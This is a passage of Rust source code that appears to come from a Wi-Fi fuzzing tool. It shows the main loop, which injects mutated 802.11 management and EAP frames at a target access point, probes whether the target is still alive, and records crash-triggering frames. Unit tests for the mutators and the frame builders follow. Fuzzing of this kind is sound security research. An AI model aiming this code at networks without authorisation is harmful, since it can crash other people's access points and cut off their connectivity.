                if mut_bit == mutation::REPEAT {
                    flen = mutate_repeat_ie(
                        &mut frame_buf, seed_len, buf_len,
                        params.ie_repeat_count, &mut rng,
                    );
                } else {
                    flen = mutate_ie_malformed(
                        &mut frame_buf, seed_len, buf_len, &mut rng,
                    );
                }
            } else {
                // Apply selected mutation
                flen = apply_mutation(
                    &mut frame_buf, seed_len, buf_len,
                    mut_bit, params, &mut rng,
                );
            }
        }

        // Fire mutation event (if logging all frames)
        if params.log_all_frames {
            push_event(events, start, FuzzEventKind::MutationApplied {
                iteration,
                frame_type: ft,
                domain: dom,
                mutation: mut_bit,
                frame_len: flen,
            });
        }

        // Inject the mutated frame
        if flen > 0 {
            if let Ok(()) = shared.tx_frame(&frame_buf[..flen], &tx_opts) {
                frames_sent += 1;
            }

            if params.log_all_frames {
                push_event(events, start, FuzzEventKind::FrameInjected {
                    iteration,
                    frame_type: ft,
                    mutation: mut_bit,
                    frame_len: flen,
                });
            }
        }

        iteration += 1;
        seq_num = seq_num.wrapping_add(1);
        batch_count += 1;

        // Update info
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.current_frame_type = ft;
            info.current_domain = dom;
            info.current_mutation = mut_bit;
            info.iteration = iteration;
            info.frames_sent = frames_sent;
            info.probes_sent = probes_sent;
            info.probes_answered = probes_answered;
            info.elapsed = start.elapsed();
        }

        // ── Rate tracking (once per second) ──
        let now = Instant::now();
        if now.duration_since(rate_start) >= Duration::from_secs(1) {
            let fps = (frames_sent - rate_checkpoint) as f64;
            rate_checkpoint = frames_sent;
            rate_start = now;

            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.frames_per_sec = fps;
            }

            push_event(events, start, FuzzEventKind::RateSnapshot {
                iteration,
                frames_sent,
                frames_per_sec: fps,
                elapsed: start.elapsed(),
                crashes_found: crash_count,
            });
        }

        // ── Health check after each batch ──
        if batch_count >= params.batch_size {
            batch_count = 0;
            let since_check = now.duration_since(last_health_check);

            if since_check >= params.probe_interval {
                last_health_check = now;

                push_event(events, start, FuzzEventKind::HealthCheckStarted);

                let alive = health_check_probe(
                    shared, reader, &target_mac, ssid, params.probe_timeout,
                    &mut probes_sent, &mut probes_answered, running, &mut rng,
                );

                push_event(events, start, FuzzEventKind::HealthCheckResult {
                    alive,
                    probes_sent,
                    probes_answered,
                });

                // Update info
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.probes_sent = probes_sent;
                    info.probes_answered = probes_answered;
                }

                if !alive {
                    // ── Potential crash detected ──
                    {
                        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                        info.phase = FuzzPhase::Monitoring;
                    }

                    push_event(events, start, FuzzEventKind::CrashDetected {
                        iteration,
                        frame_type: ft,
                        mutation: mut_bit,
                        domain: dom,
                        detect_method: detect::PROBE_TIMEOUT,
                        description: format!(
                            "Target not responding at iteration {} ({} {})",
                            iteration, ft.label(), mutation::label(mut_bit),
                        ),
                    });

                    // Wait for recovery
                    let recovery_start = Instant::now();
                    let mut recovered = false;
                    while recovery_start.elapsed() < params.recovery_wait
                        && running.load(Ordering::SeqCst)
                    {
                        if health_check_probe(
                            shared, reader, &target_mac, ssid, params.probe_timeout,
                            &mut probes_sent, &mut probes_answered, running, &mut rng,
                        ) {
                            recovered = true;
                            break;
                        }
                        thread::sleep(Duration::from_millis(500));
                    }

                    crash_count += 1;

                    // Record crash
                    let trigger_len = flen.min(MAX_CRASH_FRAME);
                    let trigger_frame = frame_buf[..trigger_len].to_vec();

                    if recovered {
                        let recovery_ms = recovery_start.elapsed().as_millis() as u32;
                        crashes_recovered += 1;

                        let desc = format!(
                            "Target went down for {}ms then recovered (iter {}, {} {})",
                            recovery_ms, iteration, ft.label(), mutation::label(mut_bit),
                        );

                        push_event(events, start, FuzzEventKind::CrashRecovery {
                            crash_num: crash_count,
                            recovery_ms,
                            description: desc.clone(),
                        });

                        let crash = FuzzCrash {
                            crash_num: crash_count,
                            iteration,
                            frame_type: ft,
                            mutation: mut_bit,
                            domain: dom,
                            detect_method: detect::PROBE_TIMEOUT,
                            elapsed: start.elapsed(),
                            target_bssid: target.bssid,
                            trigger_frame,
                            description: desc,
                            recovery_ms: Some(recovery_ms),
                        };
                        crashes.lock().unwrap_or_else(|e| e.into_inner()).push(crash);
                    } else {
                        crashes_permanent += 1;

                        let desc = format!(
                            "Target PERMANENT crash (iter {}, {} {})",
                            iteration, ft.label(), mutation::label(mut_bit),
                        );

                        push_event(events, start, FuzzEventKind::CrashPermanent {
                            crash_num: crash_count,
                            description: desc.clone(),
                        });

                        let crash = FuzzCrash {
                            crash_num: crash_count,
                            iteration,
                            frame_type: ft,
                            mutation: mut_bit,
                            domain: dom,
                            detect_method: detect::PROBE_TIMEOUT,
                            elapsed: start.elapsed(),
                            target_bssid: target.bssid,
                            trigger_frame,
                            description: desc,
                            recovery_ms: None,
                        };
                        crashes.lock().unwrap_or_else(|e| e.into_inner()).push(crash);
                    }

                    // Update crash info
                    {
                        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                        info.crashes_found = crash_count;
                        info.crashes_recovered = crashes_recovered;
                        info.crashes_permanent = crashes_permanent;
                    }

                    if params.pause_on_crash {
                        {
                            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                            info.phase = FuzzPhase::CrashFound;
                        }
                        paused.store(true, Ordering::SeqCst);
                        push_event(events, start, FuzzEventKind::Paused {
                            crash_num: crash_count,
                        });
                        // Will be caught by pause handler at top of loop
                    } else {
                        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                        info.phase = FuzzPhase::Fuzzing;
                    }
                }
            }
        }

        // Inter-frame delay
        if params.interval > Duration::ZERO {
            thread::sleep(params.interval);
        }
    }

    // ── Finalize ──
    shared.unlock_channel();
    push_event(events, start, FuzzEventKind::ChannelUnlocked);

    push_event(events, start, FuzzEventKind::AttackComplete {
        iterations: iteration,
        frames_sent,
        frames_received: probes_answered as u64,
        crashes_found: crash_count,
        crashes_recovered,
        crashes_permanent,
        elapsed: start.elapsed(),
    });

    // Final info update
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.iteration = iteration;
        info.frames_sent = frames_sent;
        info.crashes_found = crash_count;
        info.crashes_recovered = crashes_recovered;
        info.crashes_permanent = crashes_permanent;
        info.elapsed = start.elapsed();
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    // ── xoshiro256** RNG tests ──

    #[test]
    fn test_xoshiro_deterministic() {
        let mut rng1 = Xoshiro256::new(42);
        let mut rng2 = Xoshiro256::new(42);
        for _ in 0..1000 {
            assert_eq!(rng1.next_u64(), rng2.next_u64());
        }
    }

    #[test]
    fn test_xoshiro_different_seeds() {
        let mut rng1 = Xoshiro256::new(1);
        let mut rng2 = Xoshiro256::new(2);
        // Collect first 10 values — should differ
        let v1: Vec<u64> = (0..10).map(|_| rng1.next_u64()).collect();
        let v2: Vec<u64> = (0..10).map(|_| rng2.next_u64()).collect();
        assert_ne!(v1, v2);
    }

    // ── Params tests ──

    #[test]
    fn test_fuzz_params_default() {
        let p = FuzzParams::default();
        assert_eq!(p.frame_type, FuzzFrameType::All);
        assert_eq!(p.domain, FuzzDomain::Frame);
        assert_eq!(p.mutations, mutation::ALL);
        assert_eq!(p.max_iterations, 0);
        assert_eq!(p.batch_size, 10);
        assert_eq!(p.interval, Duration::from_millis(1));
        assert_eq!(p.probe_interval, Duration::from_secs(2));
        assert_eq!(p.probe_timeout, Duration::from_secs(1));
        assert_eq!(p.beacon_loss_threshold, Duration::from_secs(5));
        assert_eq!(p.recovery_wait, Duration::from_secs(10));
        assert_eq!(p.detect_methods, detect::ALL);
        assert!(p.pause_on_crash);
        assert!(!p.log_all_frames);
        assert_eq!(p.bit_flip_count, 3);
        assert_eq!(p.byte_flip_count, 2);
        assert_eq!(p.overflow_extra_bytes, 64);
        assert_eq!(p.ie_target_id, 0xFF);
        assert_eq!(p.ie_max_len, 255);
        assert_eq!(p.ie_repeat_count, 32);
        assert_eq!(p.seed, 0);
        assert_eq!(p.channel_settle, Duration::from_millis(50));
    }

    // ── Mutation tests ──

    #[test]
    fn test_mutation_bit_flip() {
        let mut rng = Xoshiro256::new(42);
        let mut frame = [0u8; 64];
        let original = frame;
        mutate_bit_flip(&mut frame, 64, 3, &mut rng);
        // At least one byte should differ
        assert_ne!(frame[..], original[..]);
        // Count differing bits
        let mut diff_bits = 0u32;
        for i in 0..64 {
            diff_bits += (frame[i] ^ original[i]).count_ones();
        }
        // Should have flipped exactly 3 bits (assuming no collisions with seed 42)
        assert!(diff_bits > 0 && diff_bits <= 3);
    }

    #[test]
    fn test_mutation_byte_flip() {
        let mut rng = Xoshiro256::new(42);
        let mut frame = [0xAA; 64];
        let original = frame;
        mutate_byte_flip(&mut frame, 64, 2, &mut rng);
        let changed = frame.iter().zip(original.iter()).filter(|(a, b)| a != b).count();
        assert!(changed > 0 && changed <= 2);
    }

    #[test]
    fn test_mutation_boundary() {
        let mut rng = Xoshiro256::new(42);
        let mut frame = [0x55; 64];
        let original = frame;
        mutate_boundary(&mut frame, 64, &mut rng);
        assert_ne!(frame[..], original[..]);
        // Check that at least one boundary value was applied
        let has_boundary_8 = frame.iter().any(|b| BOUNDARY_VALS_8.contains(b));
        // Could be a 16-bit boundary too, just check something changed
        assert!(has_boundary_8 || frame != original);
    }

    #[test]
    fn test_mutation_overflow() {
        let mut rng = Xoshiro256::new(42);
        let mut frame = [0u8; 256];
        frame[..24].fill(0xAA);
        let new_len = mutate_overflow(&mut frame, 24, 256, 64, &mut rng);
        assert_eq!(new_len, 88); // 24 + 64
        // Original bytes preserved
        assert!(frame[..24].iter().all(|&b| b == 0xAA));
        // Extended bytes should have some non-zero values (random)
        assert!(frame[24..88].iter().any(|&b| b != 0));
    }

    #[test]
    fn test_mutation_truncation() {
        let mut rng = Xoshiro256::new(42);
        let new_len = mutate_truncation(64, &mut rng);
        assert!(new_len >= 2 && new_len < 64);
    }

    #[test]
    fn test_mutation_type_confuse() {
        let mut rng = Xoshiro256::new(42);
        let mut frame = [0u8; 64];
        frame[0] = fc::BEACON;
        mutate_type_confuse(&mut frame, 64, &mut rng);
        // FC byte should be one of the confuse values
        assert!(FC_CONFUSE_VALUES.contains(&frame[0]));
    }

    #[test]
    fn test_mutation_random() {
        let mut rng = Xoshiro256::new(42);
        let mut frame = [0u8; 64];
        // Fill header with known values
        frame[..24].fill(0xAA);
        let original_header: [u8; 24] = [0xAA; 24];
        mutate_random(&mut frame, 64, &mut rng);
        // Header should be preserved
        assert_eq!(frame[..24], original_header);
        // Payload should have random bytes
        assert!(frame[24..64].iter().any(|&b| b != 0));
    }

    #[test]
    fn test_mutation_repeat_ie() {
        let mut rng = Xoshiro256::new(42);
        let our_mac = [0x02, 0x00, 0x00, 0x00, 0x00, 0x01];
        let bssid = [0x02, 0x00, 0x00, 0x00, 0x00, 0x02];
        let mut frame = [0u8; 2048];
        let len = build_seed_beacon(&mut frame, &bssid, &our_mac, "TEST", 0);
        assert!(len > 36);

        let new_len = mutate_repeat_ie(&mut frame, len, 2048, 5, &mut rng);
        // Should be longer (IE duplicated)
        assert!(new_len > len);
    }

    // ── Known-bad pattern tests ──

    #[test]
    fn test_known_bad_patterns() {
        let target = [0x00, 0x11, 0x22, 0x33, 0x44, 0x55];
        let our_mac = [0x02, 0x00, 0x00, 0x00, 0x00, 0x01];

        for seed in 0..60 {
            let mut rng = Xoshiro256::new(seed);
            let mut buf = [0u8; 2048];
            let len = build_known_bad(&mut buf, 2048, &target, &our_mac, 0, &mut rng);
            // Each pattern should produce a valid-length frame
            assert!(len > 0, "Pattern with seed {} produced empty frame", seed);
            assert!(len <= 2048, "Pattern with seed {} overflowed buffer", seed);
        }
    }

    // ── Selection tests ──

    #[test]
    fn test_pick_mutation() {
        let mut rng = Xoshiro256::new(42);
        // Enable only BitFlip and ByteFlip
        let enabled = mutation::BIT_FLIP | mutation::BYTE_FLIP;
        for _ in 0..100 {
            let picked = pick_mutation(enabled, &mut rng);
            assert!(picked == mutation::BIT_FLIP || picked == mutation::BYTE_FLIP);
        }
    }

    #[test]
    fn test_pick_frame_type_cycles() {
        let cycle = FuzzFrameType::all_concrete();
        for i in 0..30u64 {
            let ft = pick_frame_type(FuzzFrameType::All, i);
            assert_eq!(ft, cycle[(i % 10) as usize]);
        }
    }

    #[test]
    fn test_pick_domain_cycles() {
        let cycle = FuzzDomain::all_concrete();
        for i in 0..9u64 {
            let dom = pick_domain(FuzzDomain::All, i);
            assert_eq!(dom, cycle[(i % 3) as usize]);
        }
    }

    // ── Seed frame builder tests ──

    #[test]
    fn test_seed_frame_builders() {
        let target = [0x00, 0x11, 0x22, 0x33, 0x44, 0x55];
        let our_mac = [0x02, 0x00, 0x00, 0x00, 0x00, 0x01];
        let bssid = target;

        let types = [
            (FuzzFrameType::Beacon, fc::BEACON),
            (FuzzFrameType::ProbeReq, fc::PROBE_REQ),
            (FuzzFrameType::ProbeResp, fc::PROBE_RESP),
            (FuzzFrameType::Auth, fc::AUTH),
            (FuzzFrameType::AssocReq, fc::ASSOC_REQ),
            (FuzzFrameType::AssocResp, fc::ASSOC_RESP),
            (FuzzFrameType::Deauth, fc::DEAUTH),
            (FuzzFrameType::Disassoc, fc::DISASSOC),
            (FuzzFrameType::Action, fc::ACTION),
            (FuzzFrameType::Eap, fc::QOS_DATA),
        ];

        for (frame_type, expected_fc) in &types {
            let mut buf = [0u8; 2048];
            let len = build_seed_frame(&mut buf, *frame_type, &target, &our_mac, &bssid, "TEST", 0);
            assert!(len > 0, "{:?} produced empty frame", frame_type);
            assert_eq!(buf[0], *expected_fc, "{:?} has wrong FC byte: got 0x{:02x}, expected 0x{:02x}",
                frame_type, buf[0], expected_fc);
        }
    }

    // ── FuzzAttack struct tests ──

    #[test]
    fn test_fuzz_attack_new() {
        let attack = FuzzAttack::new(FuzzParams::default());
        assert!(!attack.is_running());
        assert!(!attack.is_done());
        assert!(!attack.is_paused());
        assert_eq!(attack.name(), "fuzz");
        let info = attack.info();
        assert_eq!(info.phase, FuzzPhase::Idle);
        assert!(!info.running);
        assert_eq!(info.iteration, 0);
        assert_eq!(info.frames_sent, 0);
    }

    // ── Crash frame cap test ──

    #[test]
    fn test_crash_max_frame_cap() {
        // Verify that trigger_frame is capped at MAX_CRASH_FRAME bytes
        assert_eq!(MAX_CRASH_FRAME, 512);
        let large_frame = vec![0xAA; 2048];
        let trigger = &large_frame[..large_frame.len().min(MAX_CRASH_FRAME)];
        assert_eq!(trigger.len(), 512);
    }

    // ── Label coverage tests ──

    #[test]
    fn test_all_frame_types_have_labels() {
        let types = [
            FuzzFrameType::Beacon, FuzzFrameType::ProbeReq, FuzzFrameType::ProbeResp,
            FuzzFrameType::Auth, FuzzFrameType::AssocReq, FuzzFrameType::AssocResp,
            FuzzFrameType::Deauth, FuzzFrameType::Disassoc, FuzzFrameType::Action,
            FuzzFrameType::Eap, FuzzFrameType::All,
        ];
        for t in &types {
            let label = t.label();
            assert!(!label.is_empty(), "{:?} has empty label", t);
            assert_ne!(label, "Unknown", "{:?} has 'Unknown' label", t);
        }
    }

    #[test]
    fn test_all_mutations_have_labels() {
        let bits = [
            mutation::BIT_FLIP, mutation::BYTE_FLIP, mutation::BOUNDARY,
            mutation::OVERFLOW, mutation::TRUNCATION, mutation::TYPE_CONFUSE,
            mutation::RANDOM, mutation::REPEAT, mutation::KNOWN_BAD,
        ];
        for bit in &bits {
            let label = mutation::label(*bit);
            assert!(!label.is_empty(), "Mutation 0x{:x} has empty label", bit);
            assert_ne!(label, "Unknown", "Mutation 0x{:x} has 'Unknown' label", bit);
        }
    }

    #[test]
    fn test_all_domains_have_labels() {
        let domains = [FuzzDomain::Frame, FuzzDomain::Ie, FuzzDomain::Eap, FuzzDomain::All];
        for d in &domains {
            let label = d.label();
            assert!(!label.is_empty(), "{:?} has empty label", d);
            assert_ne!(label, "Unknown", "{:?} has 'Unknown' label", d);
        }
    }

    #[test]
    fn test_all_detect_methods_have_labels() {
        let methods = [
            detect::BEACON_LOSS, detect::PROBE_TIMEOUT,
            detect::DEFORMED_RESPONSE, detect::CLIENT_DROP,
        ];
        for m in &methods {
            let label = detect::label(*m);
            assert!(!label.is_empty(), "Detect 0x{:x} has empty label", m);
            assert_ne!(label, "Unknown", "Detect 0x{:x} has 'Unknown' label", m);
        }
    }

    #[test]
    fn test_all_phases_have_labels() {
        let phases = [
            FuzzPhase::Idle, FuzzPhase::Probing, FuzzPhase::Fuzzing,
            FuzzPhase::Monitoring, FuzzPhase::CrashFound, FuzzPhase::Done,
        ];
        for p in &phases {
            let label = p.label();
            assert!(!label.is_empty(), "{:?} has empty label", p);
            assert_ne!(label, "Unknown", "{:?} has 'Unknown' label", p);
        }
    }
}
